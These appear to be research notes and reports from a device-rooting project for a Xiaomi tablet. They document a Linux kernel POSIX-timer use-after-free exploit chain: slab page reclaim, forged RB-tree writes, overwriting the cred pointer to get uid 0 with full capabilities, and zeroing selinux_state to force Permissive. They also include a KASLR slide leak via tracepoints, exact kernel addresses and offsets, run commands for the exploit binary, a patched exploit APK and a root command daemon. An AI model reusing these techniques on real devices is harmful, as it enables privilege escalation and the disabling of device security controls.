设备：小米 yingtian（Pad 9 Pro Max，XRING O3），HyperOS 4.0.16.0.XBMCNXM，Android 17
内核：6.18.21-android17-5-g805aa6adea19-abogki565292102-4k
ADB：`adb -s <serial>`；boot_id `1b71aad5-73b0-4275-81a1-ce40712c2be5`（测试期间从未重启）
工作目录：`<workspace>/work`

## 结论

**CVE-2026-98260 在此确切固件上可利用。** 从无特权的 ADB shell
（`uid=2000(shell)`，初始为 SELinux Enforcing）出发，真机运行证明了完整的原语链：

1. **UAF 已触发** —— 一个已释放的 `struct k_itimer` 节点仍挂在僵尸任务的
   `posix_cputimers` timerqueue 上（经 kprobe 验证）。
2. **已释放的 slab 页被回收** —— order-1 的 `posix_timers_cache` slab 页在定向
   `posix_timers` churn 之后回到 buddy 分配器，并被复用为用户可写的 Unix-socket
   skb 数据页（`send(..., 7872)` 恰好给出一个 order-1 页，内容完全由用户控制）。
3. **任意 8 字节内核零写** —— 在 `timerqueue_del`/`rb_erase` 中伪造 RB 树删除得到
   `*(target)=0`；用端到端回读确认（`VERDICT WRITE_PRIMITIVE_CONFIRMED`）。
4. **uid 0** —— 把 `task_struct->cred` 的 uid/gid、euid/egid、fsuid/fsgid 零写后，
   利用进程内得到 `uid=0 euid=0 gid=0`（3/3 阶段，t30）。
5. **独立推导 KASLR slide** —— `cred->user_ns - init_user_ns` 得到
   `slide=0x2c2ea00000`（对齐校验通过），与更早的 KASLR gate 结果一致。
6. **SELinux 全局切到 Permissive** —— 零写 `selinux_state.enforcing`（以及相邻的
   initialized/policycap 字节）成功：`/sys/fs/selinux/enforce` = 0、
   `getenforce` = **Permissive**；该改动在当前 boot 内保持（boot_id 未变）。

## 根因 / 脆弱代码

`begin_new_exec()`（静态 `0xffffffc0802cf910`）在 `exec_task_namespaces()`
**之后**才清理 POSIX timer，而 `mmap_read_lock_killable(old_mm)` 失败点（exec 期间
的 SIGKILL，已过 `point_of_no_return`）位于其前：`posix_cpu_timers_exit`
@0x2cfcb8、`exit_itimers` @0x2cfcc8、`flush_itimer_signals` @0x2cfccc。修复提交
acb03d388181（“exec: Cleanup POSIX timers right after de_thread()”，6.18.54+ 修复）
缺失 —— 本机内核为 6.18.21。

## 为什么更早三个“简单”原语都 miss（以及什么奏效）

* **t21**（不 exec、只 SIGKILL）说明：当父进程**没有**被 pin 时，释放的 order-1
  slab 页约有 77% 命中率——最后退出的线程把页释放到它所在 CPU 的 per-CPU
  order-1 页表，父进程恰好在同一 CPU 被唤醒。
* 真正的 UAF 路径不同：victim slab 停留在 SLUB 的 frozen/partial 状态，**从未**
  回到 buddy（t27：`W1FS fs=4628 victim=0`）。**修法：waitid 之后做
  `posix_timers` churn**（`timer_create`/`timer_delete` ×8000，t29）迫使 cache
  释放 slab；命中率提升到约 2–5 次尝试中 1 次。
* order-0 的用户可映射原语（AIO ring、perf metadata 页、pipe、dma-heap、
  io_uring）都无法回收 order-1 页；Unix-socket skb `send(7872)` 恰好分配一个
  order-1 页（gfp=0x4428c0），是可用的回收原语。

## 关键内核事实（基址 `0xffffffc080000000`）

| 项 | 值 |
| --- | --- |
| `posix_timers_cache` slab | order-1（8 KB），21 个对象 × 0x180 |
| `k_itimer` 节点（`it.cpu.entry`） | object + 0xe0 |
| task_struct 里的 timerqueue head | +0x870、+0x888、+0x8a0（缓存 next 在 +0x878/+0x890/+0x8a8） |
| `timerqueue_del` / `rb_erase` | 0xffffffc080149ec0 / 0xffffffc080149f34 |
| `posix_cpu_timers_exit` | 0xffffffc08014bfbc |
| `init_user_ns` | 0xffffffc0826d10d8 |
| `selinux_state` | 0xffffffc082959630（enforcing 在 +0x00） |
| cred 布局 | usage +0x00、uid +0x08、euid +0x18、fsuid +0x20、security +0x80、user_ns +0x90 |

本次 boot 的 slide：`0x2c2ea00000` → 运行时基址 `0xffffffecaea00000`。

## 验证后的设备状态

* SELinux：**Permissive**（全局，仅当前 boot；重启恢复）。
* 没有改动持久化文件；bootloader 仍锁定；未安装 root 服务。
* 测试只在 `/data/local/tmp` 运行（t1…t31 二进制/日志），对系统镜像只读；内核内存
  仅通过利用原语本身修改（`selinux_state` 字节、我们自己的进程 cred）。

## 实现完整 root 的剩余步骤（当时尚未实现）

零写原语无法设置 capability 掩码。完整 root 需要**指针写**变体：
`rb_parent_color = fake_cred_kva`（一个用户映射的 perf 页，其直接映射 VA 通过
`rb_alloc user_page=+0x118($retval)` 泄漏），让 `timerqueue_del` 把伪造 cred
指针写进 `task_struct->cred`；`panic_on_warn=0` 让 `brk #0x800` 的 WARN 路径不
致命。设计约束（第二次 `timerqueue_del` 递归、副作用偏移 `parent+8` vs
`parent+0x10`、伪造 cred 内容：caps = 0x1ffffffffff、security blob 沿用真实
cred）记录在工作日志中；当时尚未写代码。

```

```md
# yingtian OS4.0.16.0 OTA 内核提取与 EnneaO3V2 通路核验报告

> **Reference (partially superseded 2026-10-25)** — the OTA extraction and kernel constants are
> still accurate and used by the payload; the EnneaO3V2 route audit in this file is obsolete
> (both CVEs it covers are patched in OS4.0.16). Mainline: release v3.0.


- 生成时间：2026-10-23 14:50 (UTC+8)
- 对象：yingtian-ota_full-OS4.0.16.0.XBMCNXM-user-17.0-4215476d07.zip（10,373,766,105 B，A/B 全量 OTA）
- 目的：从 OTA 提取内核，核验现有 EnneaO3V2 越狱通路（脚本版 / APK 自动版）在该内核上是否可用

---

## 结论速览

1. **内核已完整提取并通过三重校验**：payload.bin 的 SHA-256 与 OTA 元数据 `FILE_HASH` 一致；所有解出分区的整体哈希与 payload manifest 中的 `new_partition_info.hash` 一致；重建出的 vmlinux 符号表与已知数据地址吻合。
2. 内核版本从 **`6.18.21-android17-5-g284297031c53-abogki553682993-4k`** 变为 **`6.18.21-android17-5-g805aa6adea19-abogki565292102-4k`**（构建于 2026-09-23）。
3. **现有通路依赖的数据地址与结构偏移全部未变**：`fasync`、`init_task+0x7c8`、`notif_lock`、`selinux_state`、`misc_list`、`task_struct.cred/comm`（0x908/0x918）、`cred` 布局（uid 0x08、euid 0x18、security 0x80、size 0xb8）逐项核对一致。
4. **唯一破坏点：KASLR slide 检测常量。** `ksys_read` 入口的唯一调用点返回地址（静态）从 **0xffffffc080177190** 变为 **0xffffffc08016614c**（`__arm64_sys_read+0x1c`）。因此：
   - **脚本版**：只需改这 1 个常量即可继续用（已生成 `patched/scripts/` 副本）。
   - **APK 自动版**：必须改 `classes2.dex` 里的同一常量并重新签名；不改则 slide 检测会被自身校验明确拒绝（`SLD reject slide=…`），不会静默使用错误地址。
5. **尚未验证**：CVE-2026-64560 在该内核中是否已被修复；运行期 tracefs 权限 / SELinux 状态；竞态时序参数是否需要重新调参。

---

## 1. 提取流程与完整性校验

### 1.1 payload 结构（实测）

- `payload.bin` 在 OTA zip 内偏移 5373，未压缩（stored），大小 10,373,757,059 B。
- 头部为 **大端**：`CrAU` + u64 version=2 + u64 manifest_size=359,316 + u32 metadata_sig_size=267。
- 操作数据区起点 = payload 偏移 **359,607**（24 + manifest + metadata signature）；`InstallOperation.data_offset` 相对于该起点。
- 分区操作类型：`REPLACE_XZ(8)`、`REPLACE(0)`、`REPLACE_BZ(1)`；每个操作的 32 字节 SHA-256 实际校验的是**压缩后的存储块**（已实测确认）。
- 共 42 个分区；manifest 声明 `ota-type=AB`、`pre-device=yingtian`、SDK 37、安全补丁 2026-09-01、post-build `Xiaomi/yingtian/yingtian:17/CP2A.260605.016/17OS4.0.260928.215007722.XRPDCN.S`。

### 1.2 完整性结果

| 校验项 | 结果 |
|---|---|
| `payload.bin` SHA-256 | `5e654adf2ffeaca9d501d7d8524df178f32425521a55b53c05886fe7939fb9d5` = OTA `FILE_HASH` ✅ |
| boot / init_boot / vendor_boot / dtbo / vbmeta / vbmeta_system / vbmeta_vendor | 逐个与 manifest `new_partition_info.hash` 一致 ✅ |
| 反解出的内核符号地址 | 与已知静态表吻合（见第 3 节）✅ |

## 2. 内核信息

- `boot.img`：header v4，kernel_size=42,940,928，ramdisk_size=0（内核在 boot，无 ramdisk），cmdline 为空。
- 内核为**未压缩的裸 arm64 Image**（0x38 处为 `ARMd` 魔数），image_size=0x29a0000。
- 版本字符串：

```
Linux version 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k (kleaf@build-host)
(Android (15323222, +pgo, +bolt, +lto, +mlgo, based on r584948c) clang version 22.0.1 ...)
#1 SMP PREEMPT Wed Sep 23 09:23:45 UTC 2026
```

- 关键配置（从内核内嵌 IKCONFIG 解出，共 6681 项）：`CONFIG_KPROBES=y`、`CONFIG_KALLSYMS=y`、`CONFIG_KPROBE_EVENTS=y`、`CONFIG_DEBUG_INFO_BTF=y`、`CONFIG_SECURITY_SELINUX=y`、`CONFIG_TRACING=y`、`CONFIG_RANDOMIZE_BASE=y`、`CONFIG_ARM64_VA_BITS=39`、`CONFIG_MODULES=y`。
- 产物：`ota_extract/kernel`（42,940,928 B，SHA-256 `cde87cd7…c5ad88`）、`ota_extract/vmlinux.elf`（重建符号的 ELF，139,243 个带地址符号）。

## 3. 通路核验：基准 vs 4.0.16 内核

基准值来自 [README.md](../README.md)、`scripts/run-macos.sh` 与 APK 内注入的 `classes2.dex`；新值从重建的 `vmlinux.elf` / BTF / 内核配置中取得。

| 检查项 | 旧基准（4.0.15/4.0.18 内核） | 4.0.16 内核 | 结论 |
|---|---|---|---|
| ksys_read 调用点返回地址（slide 检测用） | 0xffffffc080177190 | **0xffffffc08016614c** | ❌ 已变 |
| ksys_read 调用点数量 | 1 | 1（`__arm64_sys_read` 内 BL @0xffffffc080166148） | ✅ 单点假设仍成立 |
| `fasync`（direct_parent） | 0xffffffc08296cca8 | 0xffffffc08296cca8 | ✅ |
| `init_task+0x7c8`（direct_child） | 0xffffffc0826bfa08 | 0xffffffc0826bfa08 | ✅ |
| `avc_latest_notif_update.notif_lock`（阶段一零写目标 +1） | 0xffffffc082959629 | 0xffffffc082959629 | ✅ |
| `selinux_state` | 0xffffffc082959630 | 0xffffffc082959630 | ✅ |
| `misc_list` | 0xffffffc0827eec98 | 0xffffffc0827eec98 | ✅ |
| `task_struct.cred` / `comm`（BTF） | 0x908 / 0x918 | 0x908 / 0x918 | ✅ |
| `cred` 布局（BTF） | size 0xb8；uid 0x08、gid 0x0c、euid 0x18、security 0x80 | 完全相同 | ✅ |
| `posix_cpu_timer_del` 符号 / +72 窗口探针点 | 存在 / 有效 | 0xffffffc0800c079c / +72=0xffffffc0800c07e4（合法指令 `ldr x0,[x0,#0x968]`） | ✅ 可挂 |
| `__set_task_comm`（阶段二 cred 捕获） | 存在 | 0xffffffc0802a485c | ✅ |
| APK `classes2.dex` `KSYS_READ_RET` | 0xffffffc080177190 | 需要 0xffffffc08016614c | ❌ 必须改 |
| APK `classes.dex` `__arm64_sys_getpid` 静态地址（备用 Java KASLR 路线） | 0xffffffc08023cc30 | 0xffffffc08023d960 | ⚠️ 已变（仅备用路线） |

> **为什么数据地址不变、代码地址变了？** 新内核仍是 6.18.21 基线，数据/BSS 的布局未变（很可能是链接顺序与配置未动）；但该构建启用了 +pgo/+bolt/+lto/+mlgo，代码段很可能被重新排序，因此文本符号（ksys_read、__arm64_sys_getpid 等）地址发生移动。这正说明"现有通路的常量必须按内核构建重新核对"。

---

## 4. 唯一断点与最小修复

### 4.1 证据链

1. 反汇编 `__arm64_sys_read`（0xffffffc080166130）→ 唯一一条 `bl ksys_read` 位于 0xffffffc080166148，返回地址 = **0xffffffc08016614c**。
2. APK 注入的 `classes2.dex` 中，`SlideDetector.parseSlide` 内的 `const-wide` 字面量位于 **文件偏移 0x0dde**，值 = 0xffffffc080177190（旧值）。
3. `parseSlide` 的校验：`slide > 0`、`slide >> 44 == 0`、`slide & 0x1fffff == 0`，否则打印 `SLD reject slide=… lr=…` 并返回 0 —— 因此常量不匹配会**明确失败**，不会静默使用错误 slide。

### 4.2 修复清单

| 目标 | 操作 |
|---|---|
| 脚本版（推荐） | 把 `STATIC_KSYS_READ_LR` / `$STATIC_KSYS_READ_LR` 从 `0xffffffc080177190` 改为 **`0xffffffc08016614c`**（macOS 第 23 行；Windows 第 31 行）。已生成副本：`patched/scripts/` |
| APK 自动版 | 改 `classes2.dex` 偏移 `0x0dde` 的 8 字节字面量为 `4c 61 16 80 c0 ff ff ff`；重算 DEX 头部 checksum（偏移 8）与 SHA-1（偏移 12）；重打包并**重新签名**（签名变化 → 需卸载重装） |
| 备用 Java KASLR 路线（可选） | `classes.dex` 中两处 `__arm64_sys_getpid` 常量 0xffffffc08023cc30 → **0xffffffc08023d960**（`runMiuiKsymCacheProbe` / `runPerfKaslrProbe`） |
| 升级后首次运行 | 删除/忽略旧 `scripts/.slide_cache`，重新执行 detect |

> 说明：脚本版对 yingtian 机型的 `check` 只会给出"机型不是 lhasa"的告警（代码路径是 warn 而非 die），不影响后续步骤；dijun 黑名单仍会直接拒绝。

---

## 5. 可用性判定

| 通路 | 判定 | 说明 |
|---|---|---|
| 脚本版（adb + run-macos/run-windows） | **改 1 个常量后可用** | 阶段一/阶段二所依赖的数据地址、结构偏移、探针符号全部未变；只需新的 slide 检测常量 |
| APK 自动版（v50-auto） | **必须改 dex + 重签后才可用** | 不改则 SLD 检测被拒绝，流程无法推进到 Permissive（更拿不到 root）；app 原生库不含 kernel VA 常量，静态表由 Java/脚本传入 |
| 内核漏洞本身（CVE-2026-64560） | **未确认** | 仅凭二进制无法判定该内核是否已修复；需要用设备实测 stage1 命中率（或对比旧内核反汇编） |
| 运行期环境（tracefs / SELinux / 竞态时序） | **未验证** | 依赖刷机后的实际系统；`posix_cpu_timer_del+72` 对应指令已变化，竞态时序参数（如 TIMER_GOAL=41500）建议重测微调 |

---

## 7. 复现命令

```bash
python tools/extract_payload.py      # 从 OTA 提取分区（内置逐分区哈希校验）
python tools/unpack_boot.py ota_extract/boot.img   # boot v4 → kernel 裸 Image
python tools/kernel_cfg_btf.py       # 内核配置 + BTF 偏移 + 探针点
python tools/verify_path.py          # 静态地址表核验 + ksys_read 调用点
python tools/hash_payload.py         # payload.bin 与 FILE_HASH 比对（约 9 秒）
```

---

## 8. 注意事项

- 本报告针对 **OTA 文件中的内核**；手机当前仍是 OS4.0.15.0 系统（旧内核），两者不要混淆。
- 只要刷入 4.0.16，旧 `.slide_cache` 与 APK 自动版都会失效；脚本版需用 patched 副本重新 detect。
- CVE-2026-64560 的修复状态无法仅从内核文件确认，最终以设备实测为准。
- 原始分发包（APK、scripts/、README、SHA256SUMS）均未修改；如需 APK 补丁版（含重签），可在此基础上继续。

---

## 9. 补丁版 APK（追加交付）

已按第 4.2 节清单产出可直接安装的 APK 补丁版：

| 项 | 值 |
|---|---|
| 文件 | `patched/EnneaO3V2-4.0.16-v50-auto.apk` |
| 大小 | 25,031,847 B |
| SHA-256 | `e78c296161ab8dfc6f017e29d3cfb83843ee38837ed584243be3df97c9517575` |
| 签名 | 自签 RSA 4096，CN=Ennea O3V2 Patched，v1+v2+v3；apksigner/apksig 校验 `verified=true`（v3 通过） |
| 对齐 | `zipalign -c -p 4` 通过 |
| 改动 | classes2.dex 0x0dde（KSYS_READ_RET）；classes.dex 0x7c1338/0x7c1d84（备用路线 getpid）；DEX checksum/SHA-1 已重算 |

安装注意：签名与作者原版不同 → **必须先卸载原 App**（`adb uninstall o3.ennea.pocv1`）再安装；该 APK 仅适用于 4.0.16 内核，4.0.15 上请继续用原版 APK。

详细说明见 `patched/README.md`。

---

## 10. 真机实测与最终结论（2026-10-23 15:00–15:30）

### 10.1 设备状态

| 项 | 值 |
|---|---|
| 系统 | **OS4.0.16.0.XBMCNXM**（fingerprint `Xiaomi/yingtian/yingtian:17/CP2A.260605.016/OS4.0.16.0.XBMCNXM`） |
| 内核 | `6.18.21-android17-5-g805aa6adea19-abogki565292102-4k`（与 OTA 提取内核完全一致） |
| boot_id | `1b71aad5-73b0-4275-81a1-ce40712c2be5` |
| SELinux / root | Enforcing / 无 root |
| 已装 APK | 补丁版 SHA-256 `e78c2961…`（与 `patched/EnneaO3V2-4.0.16-v50-auto.apk` 一致） |

### 10.2 补丁验证成功

- App 自检（`/data/local/tmp/sld_result.txt`）：`slide=0x2c2ea00000`、`selinuxTarget=0xffffffecb1359629`；
- 补丁脚本 `detect`：`lr=0xffffffecaeb6614c` → `slide=0x2c2ea00000`，target 同值。
- → 新常量 **0xffffffc08016614c 正确**，App 与脚本交叉验证一致。

### 10.3 APK 自动路线：用户态入口已被 4.0.16 修复

真机日志（App 内）：

```
TELECOM_ROUTE_UNAVAILABLE Telecom completed the normal call path without UID 1000 controller delivery; the entry is patched.
... SHIZUKU_ROUTE_PASS ... ENTRY_GATE ... KASLR_ENV_GATE_FAIL value=unavailable
FAIL Shizuku shell route stopped: shell worker exited with code 2
```

即 CVE-2026-49881 的 InCallController 注入入口已被补丁关闭；shell 兜底又拿不到 slide，APK 自动路线在 4.0.16 上无法推进。

### 10.4 脚本路线：72 次竞态全部未命中

- 2 次 `stage1` × 3 轮 × 12 attempts = **72 次**，全部 `MISC_BRIDGE_MISS_PRESERVE`；
- 所有前置 gate 均通过（`TARGET_PROFILE_GATE_PASS profile=yingtian-os4-6.18.21-OS4.0.16.0.XBMCNXM`、`STAGE0_GATE_PASS slide=0x2c2ea00000`、`EXEC_REPEAT_GATE_PASS overlap=1`、探针 2/2 等），但 `ORDER1_RECLAIM_GATE changed_nodes=0`——目标页始终未被回收利用。
- 与“内核已修复”完全吻合。

### 10.5 内核修复的二进制证据（决定性）

修复补丁：Linux **`posix-cpu-timers: Prevent UAF caused by non-leader exec() race`**（commit `920f893f735e92ba3a1cd9256899a186b161928d`，2026-07-05；已 backport 至 6.1.180 / 6.6.147 / 6.12.100 / 5.10.262 等稳定版）。

- 补丁新增 `timer_lock_sighand()` helper：**重试** task 查找并锁 sighand，失败时 `smp_rmb()` + `WARN_ON_ONCE`；
- 本内核 `vmlinux` 中存在符号 **`timer_lock_sighand` @0xffffffc0804907c4**，反汇编逐条对应补丁源码：
  - `pid_task()` 查找 → `__lock_task_sighand()` → 失败**跳回重试**；
  - 查找失败时 `dmb ishld`（= `smp_rmb()`）→ 检查 `ctmr->head`/`timerqueue` → `brk #0x800`（= `WARN_ON_ONCE`）。
- `posix_cpu_timer_del` 与 `posix_cpu_timer_set` 均调用该 helper；`posix_cpu_timer_rearm` 内联了同一逻辑；
- 上游 v6.18.21 源码**没有**该 helper（仍用 `lock_task_sighand`）→ 说明 4.0.16 是**后加的安全补丁**。

### 10.6 最终结论

**4.0.16 同时修复了 CVE-2026-49881（用户态）与 CVE-2026-64560（内核 posix-cpu-timer UAF）；现有 EnneaO3V2 两条路线在该版本上均不可用。** 72 次全 miss 不是运气或参数问题，而是内核漏洞被关闭。

后续可行选项：

1. **等待工具作者发布针对新内核的新版本/新漏洞**（当前无利用面）；
2. 若有仍运行 **4.0.15**（或 lhasa 4.0.18）的其它设备，可继续使用原版 APK/脚本；
3. **降级不可行**：`ro.boot.flash.locked=1`、`ro.boot.verifiedbootstate=green`（bootloader 锁定，无法刷回旧固件）。

设备清理：已关闭 tracing、删除测试探针、恢复屏幕常亮设置；SELinux 仍 Enforcing、无 root、未做任何持久修改。

`docs/history/ROOT_ACHIEVED_OS4.0.16.md`:

```md
# CVE-2026-98260 完整 root 达成报告（HyperOS OS4.0.16.0.XBMCNXM / 内核 6.18.21）

> **Historical (first-generation chain; superseded 2026-10-25)** — this is the original
> proof-of-concept run (shell-domain t32 payload, manual command channel). The shipped flow is
> the v3.0 app (`Shizuku shell -> two-reap v3 -> KernelSU`); keep this as the first full-root
> evidence report, not as usage instructions.


日期：2026-10-24（设备 boot_id 1b71aad5-73b0-4275-81a1-ce40712c2be5 未变）
设备：Xiaomi Pad 9 Pro Max（yingtian，XRING O3），Android 17 / HyperOS 4.0.16.0.XBMCNXM
内核：6.18.21-android17-5-g805aa6adea19-abogki565292102-4k
状态：bootloader locked / verified boot green / SELinux 全局 Permissive / shell uid 2000 起手

## 结果（首次运行即成功，attempt 1）
- PTR_OK：目标 cred 指针 PTASK+0x908 (0xffffff8104071f88) 被改写为 fake cred 内核直接映射地址 0xffffff813953c000
- UIDNOW uid=0 euid=0 gid=0
- /proc/self/status：Uid/Gid 全 0，CapPrm/CapEff/CapBnd = 000001ffffffffff（41 个 capability 全集）
- SELinux context：kernel；getenforce = Permissive
- 常驻 root 服务：t32 --rootd 进程 pid 4157（父进程 init），adb shell（uid 2000）写命令文件 → rootd 以 uid 0 执行 → 回读结果
- 独立验证：adb shell 写 t32_rootd.seq/cmd，rootd 执行 "id; getenforce; boot_id"，返回 uid=0(root) + Permissive + boot_id

## 利用链（6.18.21 适配版）
1. CVE-2026-98260：exec/de_thread 竞态导致 POSIX CPU timer 的 k_itimer 节点在 kfree_rcu 后仍挂在 task 的 timerqueue 上（stale node）。
2. 页回收：perf_event ring buffer 页（perf_event_open 的 rb_alloc 页，内核直接映射、用户可 mmap 可写）回收已释放的 posix_timers order-1 slab 页；kretprobe rb_alloc 的 user_page=+0x118($retval) 泄露该页内核 VA（fakekva）。
3. 二次删除：waitpid 回收僵尸 → posix_cpu_timers_exit → cleanup_timerqueue → timerqueue_del 对 stale 节点执行 rb_erase。构造两个节点：
   - N（victim 页 A+0xe0）：[N]=fakekva，[N+8]=0，[N+0x10]=T（T=PTASK+0x908）
   - fakekva 处伪造 cred（page 首部）：usage=0x100000，uid/gid/suid/sgid/euid/egid/fsuid/fsgid=0，cap_permitted/effective=0x1ffffffffff（+0x38/+0x40），security/user/user_ns/ucounts/group_info 复用真实 cred 字段
4. rb_erase Case2：*(T) = pc = fakekva → cred 指针被改；第二次删除 safe 收尾（WARN 容忍，panic_on_warn=0）。
5. waitpid 返回后立即 repair 用户态页（恢复 usage/caps），getuid()=0，fork/exec 子进程继承 fake cred。

## 产物
- work/t32.c（30.6 KB，完整 C 源码，需 NDK r28c aarch64-linux-android35 clang 编译）
- work/t32.exe（42,008 B，已推送 /data/local/tmp/t32.exe）
- work/build_t32.sh、work/b32.log
- work/t32_run1.log（完整运行日志）、work/t32_proof1.txt、work/t32_rootd1.out
- work/t32_rootd.log（rootd 自身日志）

## 运行方式
adb push t32.exe /data/local/tmp/
adb shell 'cd /data/local/tmp; ./t32.exe 10000 14000 300 1 4 1 8000 800'
参数：NFILL=10000, pairs=14000, delay=300, mode=1(全核喷页), attempts=4, reps=1, churn=8000, chwait=800

## rootd 使用（本次 boot 内有效）
adb shell 向 /data/local/tmp/t32_rootd.cmd 写命令，向 t32_rootd.seq 写递增序号，
rootd 执行后把结果写 /data/local/tmp/t32_rootd.out，完成标记 t32_rootd.done。
示例：
echo 2 > /data/local/tmp/t32_rootd.seq
echo "id; getenforce" > /data/local/tmp/t32_rootd.cmd
sleep 1; adb shell cat /data/local/tmp/t32_rootd.out

## 限制与风险
- root 仅当前 boot 周期有效（reboot 后需重跑 t32.exe；rootd 进程随 reboot 消失）。
- SELinux 已处于全局 Permissive（此前阶段写入），并非 exploit 的持久配置；reboot 后恢复 Enforcing。
- 未触碰 bootloader / vbmeta / 系统分区；无持久化修改。
- 可下一步：利用现有 uid 0 + full caps，尝试 KernelSU LKM late-load（若 6.18 有可用 LKM）或其它常驻方案。

```

`experiments/README.md`:

```md
# experiments — branch `exp/v3-tracepoint` (merged as v3.0)

Prototypes for the v3 direction suggested by [EAEdward/xiaomi9pmroot](https://github.com/EAEdward/xiaomi9pmroot)
(MIT). See `docs/PRIOR-ART.md` for the comparison and the credit.

**Status:** A is the shipped default since v3.0 (two-reap payload); B/C/D remain
prototypes. The single-reap combination of A+D was attempted as v3a and panicked
three times — see “Outcome in v3.0” at the end.

These are **research prototypes**, not part of the shipped payload. They do not
modify the device beyond enabling one ftrace event for the duration of the run.

## B — tracepoint-only KASLR slide (`tp_slide.c`)

Goal: recover the arm64 KASLR slide with **no kprobes, no perf, no root** — only
the static `kmem_cache_alloc` tracepoint and the per-CPU raw trace buffer.

Two independent anchors from our 6.18.21 vmlinux:

| anchor | static link address | allocation |
|---|---|---|
| `TIMER_LINK` | `0xffffffc0803a726c` (`alloc_posix_timer`) | `timer_create()` → `bytes_req = 0x180` |
| `CRED_LINK` | `0xffffffc08026d1b4` (`prepare_creds`) | `setresuid(same uid)` → `bytes_req = 0xb8` |

Because the KASLR slide is a multiple of 2 MiB, the recorded `call_site` equals
`LINK + slide`; two agreeing samples plus the independent cred anchor must
reproduce the same slide, otherwise the program prints `REFUSE`.

Mechanics:

1. Enable the event through the `rss_stat` trigger (world-writable). The
   `events/kmem/kmem_cache_alloc/enable` file itself is `0640 root:readtracefs`,
   so it is not writable from the shell — and under Enforcing even reading it
   returns `EACCES`; the trigger write and the raw read still work.
2. Pin to CPU0, `tracing_on=1`, create/delete a `CLOCK_THREAD_CPUTIME_ID` timer
   (or `setresuid` for the cred anchor), `tracing_on=0`.
3. Read `/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw` (raw records, not the
   text file — the text form prints `%pS` symbols and hashed `%p` pointers).
   Record layout relative to `call_site`: `+0 site, +8 ptr, +24 bytes_req`.
4. Require `slide % 2 MiB == 0`, two equal samples, and `cred.site == CRED_LINK + slide`.

Build and run:

```bash
CC=/path/to/ndk/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android35-clang
$CC -std=gnu11 -O2 -o tp_slide tp_slide.c
adb push tp_slide /data/local/tmp/tp_slide && adb shell chmod 755 /data/local/tmp/tp_slide
adb shell /data/local/tmp/tp_slide
```

Measured on yingtian (Xiaomi Pad 9 Pro Max, `6.18.21-android17-5-g805aa6adea19-…`):

| state | result |
|---|---|
| shell, Permissive | `SLIDE 0xf91200000`, `CRED_ANCHOR match=1` |
| shell, **Enforcing**, uid 2000, no root | `SLIDE 0x1db3000000`, `CRED_ANCHOR match=1` (boot `c774e834-…`) |

The Enforcing run is the one that matters: it uses only a world-writable
trigger, a readable raw pipe and two ordinary syscalls, which is exactly the
privilege the payload has inside the Shizuku shell before exploitation.

### Cross-check against the real exploit

On the same boot (`c774e834-592e-4750-97df-3c22ca751606`) the payload was run
directly (`work/o3p.bin`, which leaks `init_user_ns` for its own slide) and
printed:

```
SLIDE_CALC un=0xffffffde356d10d8 slide=0x1db3000000 align=1
```

i.e. the tracepoint-only measurement (`0x1db3000000`) agrees with the payload's
independent cred/`init_user_ns`-based measurement on the same boot.

## Next (not implemented yet)

- **A**: stage0 target `selinux_state - 7` with a zero write, so only the
  `enforcing` byte is cleared (`initialized`/`policycap` untouched). Goal:
  drop the KernelSU `mov w0,#0` init patch and keep the kernel SELinux state
  clean while KSU restores Enforcing — validate Wi-Fi + manager under Enforcing.
- **C**: PFN-verified page reclaim (`mm_page_free` + `mm_filemap_add_to_page_cache`
  → AIO ring index) instead of blind spray + retry.
- **D**: one UAF, three trees (PROF/VIRT/SCHED) → three independent `rb_erase`
  writes per reclaim (cred + enforcing-only zero + no-op).

## A — unaligned `selinux_state - 7` zero + KernelSU without the init patch

The payload now understands two experimental environment variables:

- **shipped default since v3.0** (originally gated as `O3P_SELZERO=1`; legacy
  `O3P_SELDIRTY=1` restores the old dirty write) — stage0 targets
  `selinux_state - 7` and writes **0**, so the `enforcing` byte becomes 0 while
  `initialized` and `policycap[]` stay intact (the old stage0 wrote a pointer
  *into* `selinux_state` and clobbered `policycap`, which later broke Wi-Fi when
  SELinux returned to Enforcing).
- `O3P_NO_CODEPATCH=1` — skip the KernelSU `.init.text` `mov w0,#0` patch, so
  upstream KernelSU restores Enforcing through its own init hook.

Measured on a clean boot (`3976b14a-…`, Enforcing, no KernelSU loaded), tiann
LKM, official 375,328-byte build:

```
SELREAD got=1 zero=1
SELWRITE target=0xffffffde4d759629 want=0x0 val=0x0 SEL_OK state=0x0100000101010100
ENFORCE:[0]
...
KSU_LOADER kallsyms found=225 missing=0
KSU_CODEPATCH skip
KSU_INSMOD_OUT:[rc=0
KSU_MODULE LIVE
```

`state=0x0100000101010100` read back from `selinux_state`: byte0 = `0x00`
(enforcing cleared), byte1 = `0x01` (initialized intact), bytes 2..7 keep the
original policy capabilities. After KernelSU's init ran:

- `getenforce` → `Enforcing`;
- manager shows `工作中 [越狱模式]`, `SELinux 强制执行`;
- `ping 10.30.0.1` → 0% loss, `nc 223.5.5.5:443` → rc 0.

So without the `KSU_CODEPATCH` patch the kernel comes back to Enforcing with a
**clean** `selinux_state` and networking still works — the failure we chased in
v1.8 was policy-capability pollution, not Enforcing itself.

Caveats:

- `selinux_state - 7` also clears the last seven bytes of
  `avc_latest_notif_update.notif_lock` (unlocked in practice); this needs a
  per-build check before any shipped use.
- Rootd started *after* KernelSU restores Enforcing still works (socket + peercred),
  but some commands inside the shell domain are constrained; a v3 design would
  rely on KernelSU's `su` for post-root work instead of the shell-domain rootd.

## C — PFN-verified reclaim (`tp_reclaim.c`)

Goal: without kprobes or perf, tell **which AIO ring page owns a freed
`posix_timers` slab page**, so a real payload can stop guessing.

Method:

1. `kmem_cache_alloc` tracepoint + raw trace: `call_site == alloc_posix_timer +
   slide`, `bytes_req == 0x180`, `pid == self` -> k_itimer object addresses;
2. turn every address into page-frame numbers: the containing slab page
   (`addr & ~0xfff`) and the page holding `k_itimer.it` (`addr + 0xe0`), with
   order-1 slabs recording the even pfn;
3. enable `mm_page_free`, `mm_page_alloc` and
   `filemap:mm_filemap_add_to_page_cache`, then arm the timers, delete them and
   spray `io_setup(1)` rings on every CPU with pacing;
4. parse the per-CPU text traces: the N-th filemap line of CPU c is ring c/N.
   A watched pfn appearing there means that ring owns one of the slab pages.

Build and run:

```bash
NDK=/path/to/android-ndk-r28c/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang
$NDK -O2 -pthread -o tp_reclaim tp_reclaim.c
adb push tp_reclaim /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/tp_reclaim
